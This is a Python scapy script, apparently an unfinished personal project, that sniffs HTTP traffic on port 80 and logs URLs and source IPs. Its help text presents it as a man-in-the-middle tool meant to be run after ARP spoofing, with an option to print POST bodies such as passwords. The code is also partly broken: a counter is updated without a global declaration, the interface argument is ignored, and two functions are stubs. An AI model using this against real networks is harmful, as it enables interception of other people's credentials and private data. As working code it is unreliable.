import threading
from scapy.all import *
from scapy.layers.http import HTTPRequest # import HTTP packet
# from scapy import *
from colorama import init, Fore
# initialize colorama
init()
# define colors
GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET

# NOTE: MAKING THE SAVED DIR MANUALLY FOR NOW
LOG_FILENUM = 0
LOG_FILENAME = "./saved/log"
LOG_LINE_READ = 0
LOG_LINE_WRITE = 0
STATS_FILE = "./saved/stats"

def sniff_packets(iface=None):
    """
    Sniff 80 port packets with `iface`, if None (default), then the
    Scapy's default interface is used
    """
    if iface:
        # port 80 for http (generally)
        # `process_packet` is the callback
        sniff(filter="port 80", prn=process_packet, iface=conf.iface, store=False)
    else:
         # sniff with default interface
        sniff(filter="port 80", prn=process_packet, store=False)

def process_packet(packet):
    """
    This function is executed whenever a packet is sniffed
    """
    log_filename = LOG_FILENAME + str(LOG_FILENUM) + ".txt"
    logfile = open(log_filename, 'a+')
    if packet.haslayer(HTTPRequest):
        # if this packet is an HTTP Request
        # get the requested URL
        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
        # get the requester's IP Address
        ip = packet[IP].src
        # get the request method
        method = packet[HTTPRequest].Method.decode()
        print(f"\n{GREEN}[+] {ip} Requested {url} with {method}{RESET}")
        
        # write logs to logfile
        logline = url + ":" + ip + "\n"
        logfile.write(logline)
        LOG_LINE_WRITE += 1

        # check if we need a new logfile
        if LOG_LINE_WRITE > 500:
            reset_logfile()

        if show_raw and packet.haslayer(Raw) and method == "POST":
            # if show_raw flag is enabled, has raw data, and the requested method is "POST"
            # then show raw
            print(f"\n{RED}[*] Some useful Raw data: {packet[Raw].load}{RESET}")
    if not logfile.closed:
        logfile.close()

def reset_logfile():
    print("not yet boyo")

'''
Open log file and process from line saved_line_num and filename, along with other stats collected in stats file. Update saved_line_num and if saved_line_num is too large, open new file and change file name. 
'''
def aggregate_statistics():
    threading.Timer(10.0, aggregate_statistics).start()
    print("nothing for now")


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="HTTP Packet Sniffer, this is useful when you're a man in the middle." \
                                                 + "It is suggested that you run arp spoof before you use this script, otherwise it'll sniff your personal packets")
    parser.add_argument("-i", "--iface", help="Interface to use, default is scapy's default interface")
    parser.add_argument("--show-raw", dest="show_raw", action="store_true", help="Whether to print POST raw data, such as passwords, search queries, etc.")
    # parse arguments
    args = parser.parse_args()
    iface = args.iface
    show_raw = args.show_raw
    aggregate_statistics()
    sniff_packets(iface)
